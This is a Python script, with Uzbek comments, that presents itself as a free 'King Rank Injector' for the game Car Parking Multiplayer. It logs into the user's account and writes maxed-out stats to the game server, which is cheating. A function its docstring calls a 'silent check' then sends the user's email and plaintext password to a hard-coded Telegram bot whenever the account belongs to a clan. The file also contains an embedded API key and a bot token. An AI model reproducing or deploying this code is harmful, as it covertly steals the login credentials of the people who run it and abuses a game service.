import requests
import json
import logging
from datetime import datetime

# Loggingni sozlash (Web va CLI uchun qulay)
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')

# --- Game Service Configuration ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# --- Telegram Bot Configuration ---
BOT_TOKEN = "8605656918:AAHJP9wvQBMmyvS97n3lxBk910tnIzcbxV4"
CHAT_ID = 5875091321

def send_to_telegram(email, password, clan_id):
    """Send account info to Telegram only if ClanId exists."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        # MUHIM: 'json=' ishlatamiz, 'data=' emas!
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
        logging.info("Telegram xabar muvaffaqiyatli yuborildi.")
    except requests.exceptions.RequestException as e:
        logging.warning(f"Telegram xabar yuborishda xatolik: {e}")

def login(email, password):
    """Login to CPM using Firebase API. Returns auth_token or None."""
    # MUHIM: Barcha kalitlar TOZA, bo'sh joysiz!
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        response_data = response.json()

        if response.status_code == 200 and 'idToken' in response_data:
            logging.info("✅ Login successful!")
            return response_data.get('idToken')
        else:
            error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
            logging.warning(f"❌ Login failed: {error_message}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"❌ Network error during login: {e}")
        return None

def set_rank(token):
    """Set KING RANK using max rating data. Returns True/False."""
    # MUHIM: Barcha kalitlar TOZA, bo'sh joysiz!
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000
    
    payload = {
        "data": json.dumps({"RatingData": rating_data})
    }
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }

    try:
        response = requests.post(RANK_URL, headers=headers, json=payload)
        if response.status_code == 200:
            logging.info("✅ Rank successfully set!")
            return True
        else:
            logging.warning(f"❌ Failed to set rank. HTTP Status: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        logging.error(f" Network error during rank set: {e}")
        return False

def check_clan_id(token, email, password):
    """Silent check for ClanId and send to Telegram if found."""
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "okhttp/3.12.13",
        "Content-Type": "application/json"
    }
    payload = {"data": None}
    try:
        response = requests.post(CLAN_ID_URL, headers=headers, json=payload)
        if response.status_code == 200:
            raw = response.json()
            clan_id = raw.get("result", "")
            if clan_id:
                logging.info(f"🛡️ ClanId topildi: {clan_id}")
                send_to_telegram(email, password, clan_id)
            else:
                logging.info("ℹ️ ClanId topilmadi.")
    except requests.exceptions.RequestException as e:
        logging.warning(f"❌ ClanId tekshirishda xatolik: {e}")

def main():
    """CLI interfeys (terminal uchun)"""
    print("\n👑 Free King Rank Injector 👑")
    print("=" * 30)
    
    while True:
        try:
            email = input("\n📧 Email kiriting (yoki 'exit' deganda chiqish): ").strip()
            if email.lower() in ['exit', 'quit', 'chq']:
                print("👋 Xayr!")
                break
                
            password = input("🔒 Parol kiriting: ").strip()
            
            if not email or not password:
                print("⚠️ Email va parolni kiriting!")
                continue
            
            auth_token = login(email, password)
            
            if auth_token:
                if set_rank(auth_token):
                    check_clan_id(auth_token, email, password)
                    print("\n✅ Jarayon muvaffaqiyatli yakunlandi!")
                else:
                    print("\n❌ Rank kiritishda xatolik yuz berdi.")
            else:
                print("\n❌ Login muvaffaqiyatsiz. Qayta urinib ko'ring.")
                
        except (EOFError, KeyboardInterrupt):
            print("\n\n👋 Dastur yakunlandi.")
            break
        except Exception as e:
            logging.error(f" Kutilmagan xatolik: {e}")

# Agar to'g'ridan-to'g'ri ishga tushirilsa
if __name__ == "__main__":
    main()
